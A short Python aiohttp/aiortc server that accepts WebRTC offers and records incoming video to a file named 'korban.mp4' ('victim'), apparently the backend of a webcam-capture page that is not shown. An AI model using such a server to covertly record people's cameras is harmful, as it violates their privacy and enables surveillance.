from aiohttp import web
from aiortc import RTCPeerConnection, RTCSessionDescription
from aiortc.contrib.media import MediaRecorder
import json
import asyncio

pcs = set()

async def offer(request):
    params = await request.json()
    offer = RTCSessionDescription(sdp=params["sdp"], type=params["type"])

    pc = RTCPeerConnection()
    pcs.add(pc)

    @pc.on("track")
    def on_track(track):
        if track.kind == "video":
            recorder = MediaRecorder("korban.mp4")
            recorder.addTrack(track)
            asyncio.create_task(recorder.start())

    await pc.setRemoteDescription(offer)
    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)

    return web.Response(
        content_type="application/json",
        text=json.dumps({"sdp": pc.localDescription.sdp, "type": pc.localDescription.type})
    )

async def on_shutdown(app):
    coros = [pc.close() for pc in pcs]
    await asyncio.gather(*coros)

app = web.Application()
app.on_shutdown.append(on_shutdown)
app.router.add_post("/offer", offer)
app.router.add_static('/static', path='../static')
app.router.add_get('/', lambda _: web.FileResponse('../templates/index.html'))

web.run_app(app, port=3000)
